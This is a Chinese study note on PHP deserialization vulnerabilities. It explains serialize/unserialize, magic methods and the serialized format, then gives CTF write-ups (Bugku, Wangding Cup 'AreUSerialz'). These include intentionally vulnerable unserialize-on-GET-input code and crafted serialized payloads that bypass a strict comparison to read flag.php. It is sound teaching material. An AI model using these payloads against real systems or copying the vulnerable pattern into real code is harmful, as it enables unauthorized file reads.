![](https://img.yatjay.top/md/202203191414298.png)



# 涉及知识

## PHP序列化和反序列化

### 序列化和反序列化

所有php里面的值都可以使用函数`serialize()`来返回一个包含字节流的字符串来表示。`unserialize()`函数能够重新把字符串变回php原来的值。 序列化**一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字**。 ——php官方文档

通俗理解：序列化就是将对象转换成字符串。字符串包括：属性名、属性值、属性类型和该对象对应的类名。简单的理解就是，再程序结束的时候，存在内存的记忆资料(变量，对象等)都会被立即销毁，但是有的时候，我们需要存储并传递一些持久类习性的数据时，就不能再将资料存储在内存里了，这时候，php序列化就将记忆资料的变量存储在了档案中(比如存储在mysql数据库中)

反序列化则相反的将字符串重新恢复成对象中的成员变量

对象的序列化利于对象的保存和传输，也可以让多个文件共享对象。

序列化和反序列化在php应用系统中，一般被用作缓存(cookie、session缓存等)

![](https://img.yatjay.top/md/202203191511206.png)
涉及基本函数如下

| 函数           | 功能                                                         |
| -------------- | ------------------------------------------------------------ |
| serialize()    | 将一个对象转换成一个字符串                                   |
| unserialize()  | 将字符串还原成一个对象。unserialize 函数的变量可控，文件中存在可利用的类，类中有魔术方法：参考：https://www.cnblogs.com/20175211lyz/p/11403397.html |


### 魔术方法

#### 构造函数`__construct()`和析构函数`__destruct()`

- 构造函数`__construct()`
  具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。
- 析构函数`__destruct()`
  析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。

`new`出一个新的对象时就会调用`__construct()`,而对象被销毁时，例如程序退出时，就会调用`__destruct()`

#### `__sleep()`和`__wakeup()`

![](https://img.yatjay.top/md/202203192214086.png)

#### `__toString()`

![](https://img.yatjay.top/md/202203192214512.png)

#### `__invoke()`, `__call()`

当尝试以调用函数的方式调用一个对象时，`__invoke()` 方法会被自动调用。

在对象中调用一个不可访问方法时，`__call()` 会被调用。


涉及魔术方法如下：
| 函数           | 触发条件                    |
| -------------- | ------------------------------------------------------------ |
| __construct() | 创建对象时触发 |
| __destruct() | 对象被销毁时触发 |
| call() | 在对象上下文中调用不可访问的方法时触发 |
| callStatic() | 在静态上下文中调用不可访问的方法时触发 |
| get() | 用于从不可访问的属性读取数据 |
| set() | 用于将数据写入不可访问的属性 |
| isset() | 在不可访问的属性上调用 isset()或 empty()触发 |
| unset() | 在不可访问的属性上使用 unset()时触发         |
| __invoke() | 当脚本尝试将对象调用为函数时触发 |

### 示例：不涉及“类”的序列化和反序列化

#### 字符串序列化

```php
<?php
$KEY = 'xiaodi';
echo serialize($KEY);
?>
```

![](https://img.yatjay.top/md/202203191539367.png)

解析：`s:6:"xiaodi";`

s：变量数据类型，表示string

6：变量名长度

“xiaodi”：变量名

![](https://img.yatjay.top/md/202203191529524.png)

#### 字符串反序列化

```php
<?php
$KEY = 's:6:"xiaodi";';
echo unserialize($KEY);
```

![](https://img.yatjay.top/md/202203191543093.png)

#### 整型序列化

```php
<?php
$KEY = 123;
echo serialize($KEY);
```

![](https://img.yatjay.top/md/202203191539949.png)

#### 整型反序列化

```php
<?php
$KEY = 'i:123;';
echo unserialize($KEY);
```

![](https://img.yatjay.top/md/202203191541645.png)

### 示例：涉及“类”的序列化和反序列化

#### 对象的序列化

```php
<?php

class student{
    public $name;
     public $age;
     public $number;

     //_construct：创建对象时初始化
     function __construct($name,$age,$number){        
          $this->name = $name;
          $this->age = $age;
          $this->number = $number;
     }
}

$student = new student("Jack",22,11086);//上面重写了析构函数才能这样赋初值
var_dump(serialize($student));  //输出上述对象的序列化结果

?>
```

![](https://img.yatjay.top/md/202203192231098.png)

`O:7:"student":3:{s:4:"name";s:4:"Jack";s:3:"age";i:22;s:6:"number";i:11086;}`

O代表对象；7代表对象名长度；3代表3个成员变量；其余参照如下

|  类型   |                             结构                             |
| :-----: | :----------------------------------------------------------: |
| String  |                        s:size:value;                         |
| Integer |                           i:value;                           |
| Boolean |                      b:value;(保存1或0)                      |
|  Null   |                              N;                              |
|  Array  | a:size:{key definition;value definition;(repeated per element)} |
| Object  | O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)} |

#### 对象的反序列化

```php
<?php

class student{
    public $name;
     public $age;
     public $number;

     //_construct：创建对象时初始化
     function __construct($name,$age,$number){        
          $this->name = $name;
          $this->age = $age;
          $this->number = $number;
     }
}

$student = 'O:7:"student":3:{s:4:"name";s:4:"Jack";s:3:"age";i:22;s:6:"number";i:11086;}';

var_dump(unserialize($student));  //输出上述字符串反序列化结果

```

![](https://img.yatjay.top/md/202203192237506.png)

### PHP反序列化漏洞

未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL 注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。

### 技术——面向对象

有类无类，看代码中有没有写class

#### 有类

开发者在书写程序时书写了class，称为类，这些类当中存在一些魔术方法，比如`_construct()`、`_destruct()`、`_wakeup()`、`_toSrting()`

#### 无类

开发者在书写程序时没有用到class，不会触发魔术方法

### 利用

1. 真实应用

2. 各种CTF比赛中

### 危害

反序列化的数据本质上来说是没有危害的,用户可控数据进行反序列化是存在危害的 所以反序列化的危害，关键还是在于可控或不可控。

1. SQL注入

2. 代码执行

3. 目录遍历

# 演示案例

### PHP反序列化热身——无类问题——本地

reshen.php

```php
<?php
error_reporting(0);
include "flag.php";
$KEY = "liuyifei";
$str = $_GET['str'];
if (unserialize($str) === "$KEY")
{
    echo "$flag";
}
show_source(__FILE__);
```

flag.php

```php
<?php
    $flag = "I love liuyifei";
```



访问`reshen.php`，前端显示此php源码

通过阅读`reshen.php`代码可知，只有当反序列化`$str`的结果和`$KEY`相匹配，才能输出flag。而`$KEY=“liuyifei”`，根据反序列化的机制，只需将`“liuyifei”`字符串通过`serialize()`函数序列化之后，其结果通过`unserialize()`反序列化结果才为`“liuyifei”`

编写serialize.php内容如下，用于获得“liuyifei”字符串的序列化结果

```
<?php
$KEY = 'liuyifei';
echo serialize($KEY);
```

![](https://img.yatjay.top/md/202203191554128.png)

以GET方式向reshen.php提交上述序列化结果`s:8:"liuyifei";`，以供反序列化，即payload为`http://localhost/test/reshen.php?str=s:8:%22liuyifei%22;`

成功得到flag

![](https://img.yatjay.top/md/202203191555604.png)



## CTF反序列化小真题——无类执行——实例

地址：https://ctf.bugku.com/challenges#flag.php   web类题目，题目名称为`点login咋没反应`(此题目现在和视频讲解有出入，大体一致)

![](https://img.yatjay.top/md/202203191605411.png)

支付金币后访问靶场地址，如下图所示

![](https://img.yatjay.top/md/202203191606922.png)

### 信息收集

右键查看页面源代码，发现存在一个超链接如下

![](https://img.yatjay.top/md/202203191628739.png)

点击后显示一些提示如下，即提示我们以GET方法提交参数`8948`进行尝试

![](https://img.yatjay.top/md/202203191629323.png)

回到登录页面，提交GET参数8948，可以看到返回后台代码如下

![](https://img.yatjay.top/md/202203191630016.png)

### 白盒审计

阅读提示的后台代码可知，若GET方式提交参数`8948`，返回后台源代码。

否则如果GET参数为空，以Cookie方式提交参数`BUGKU`，且`BUGKU参数值`反序列化之后的结果和`$KEY='ctf.bugku.com'`相匹配，才能输出flag

了解了以上代码机制，我们的解题思路就是

1. 对`'ctf.bugku.com'`字符串进行序列化，得到其序列化之后的值
2. 令`GET`参数为空值，`Cookie`方式的`BUGKU`参数值为上述序列化之后的值，提交数据包

实际解题过程如下

由以下代码得到序列化结果为：`s:13:"ctf.bugku.com";`

```php
<?php
$KEY = 'ctf.bugku.com';
echo serialize($KEY);
```

![](https://img.yatjay.top/md/202203191637177.png)

令GET方式不提交任何参数，访问时进行抓包，修改(添加)HTTP请求头中的Cookie字段，提交后响应数据包中出现flag值

![](https://img.yatjay.top/md/202203191641739.png)

## CTF反序列化练习题——有类魔术方法触发——本地

### 实验演示

以下代码用来测试在有类时，序列化过程会触发哪些魔术方法

```php
<?php
header("Content-type:text/html;charset=utf-8");//解决中文乱码
class ABC
{
    public $test;
    function __construct()
    {
        $test = 1;
        echo '调用了构造函数<br>';
    }
    function __destruct()
    {
        echo '调用了析构函数<br>';
    }
    function __wakeup()
    {
        echo '调用了苏醒函数<br>';
    }
}
echo '创建对象a<br>';
$a = new ABC;
echo '序列化<br>';
$a_ser = serialize($a);
echo '反序列化<br>';
$a_unser = unserialize($a_ser);
echo '对象快要死了！';
```

访问后结果如下

![](https://img.yatjay.top/md/202203192247966.png)

### 实验结论

`new`创建对象——生成新的对象——自动触发构造函数

`serialize()`序列化——将对象转化成字符串——不触发魔术方法

`unserialize()`反序列化——将字符串转化成对象——自动触发`_wakeup()`函数

程序运行结束——销毁对象——自动触发析构函数，且调用了两次：分别销毁`$a`和`$a_unser`

## 网鼎杯2020青龙大真题——有类魔术方法触发——实例

地址：https://www.ctfhub.com/#/challenge  进入后勾选Web方向、网鼎杯，题目名称为`AreUSerialz`，开启题目

进入环境后显示一页PHP代码，如下

```php
 <?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }
}
```

### 分析代码

注意这段代码中的`__construct()`、`__destruct()`两个方法，在创建对象时自动触发`__construct()`方法，销毁对象时自动触发`__destruct()`方法

分析上述代码的执行过程如下

<img src="https://img.yatjay.top/md/202203201054233.jpg" style="zoom:50%;" />



### 解题思路

若要输出flag，需要程序正确运行至process()中的read()，再输出flag

关键点在于绕过`===`和`==`，使得最后的`op=="2"`判断成功，这里就要区分PHP中的`===`和`==`

比较运算符 `== `(相等运算符) 和 `=== `(恒等运算符) 用于比较两个值。他们也被称为 宽松等于 (`==`) 和 严格等于 (`===`) 运算符。

| 符号 | 名称   | 例子      | 输出结果                              |
| :--- | :----- | :-------- | :------------------------------------ |
| ==   | 等于   | $a == $b  | 忽略类型，如果 $a 等于 $b 则为 TRUE   |
| ===  | 恒等于 | $a === $b | 如果 $a 等于 $b,并且类型相同则为 TRUE |

基于此我们有如下绕过思路：即令`op = " 2"`，使得`op === "2"`判断为否，不会执行`op="1"`；`op=="2"`判断为真，读取`flag.php`并输出，根据代码中FileHandler类的写法，我们还需要得到这个类的一个实例的序列化结果，且该实例的三个属性值分别为：

- $op = " 2";

- $filename = flag.php;

- $content = “xxxx”;

### 解题过程

因此我们通过如下代码得到该对象序列化之后的值

```php
<?php
class FileHandler{
    public $op=" 2";
    public $filename="flag.php";
    public $content="123";
}
$filehandler = new FileHandler;
$str = serialize($filehandler);
echo $str;
?>
```

![](https://img.yatjay.top/md/202203201110328.png)

通过GET方法在题目页面提交str参数值，返回结果如下

![](https://img.yatjay.top/md/202203201113150.png)

查看页面源代码得到flag值为`FLAG = "ctfhub{01b6ae7e9a5ed268cfa42906}`

注意提交格式为`ctfhub{01b6ae7e9a5ed268cfa42906}`

![](https://img.yatjay.top/md/202203201113642.png)

# 涉及资源

http://www.dooccn.com/php/

https://www.ctfhub.com/#/challenge

https://ctf.bugku.com/challenges#flag.php

https://cgctf.nuptsast.com/challenges#Web

https://www.cnblogs.com/20175211lyz/p/11403397.html

无类的PHP序列化代码示例
```php
<?php
error_reporting(0);
include "flag.php";
$KEY = "liuyifei";
$str = $_GET['str'];
if (unserialize($str) === "$KEY")
{
    echo "$flag";
}
show_source(__FILE__);
```

有类的PHP序列化代码示例：
```php
<?php
class ABC
{
    public $test;
    function __construct()
    {
        $test = 1;
        echo '调用了构造函数<br>';
    }
    function __destruct()
    {
        echo '调用了析构函数<br>';
    }
    function __wakeup()
    {
        echo '调用了苏醒函数<br>';
    }
}
echo '创建对象a<br>';
$a = new ABC;
echo '序列化<br>';
$a_ser = serialize($a);
echo '反序列化<br>';
$a_unser = unserialize($a_ser);
echo '对象快要死了！';
```

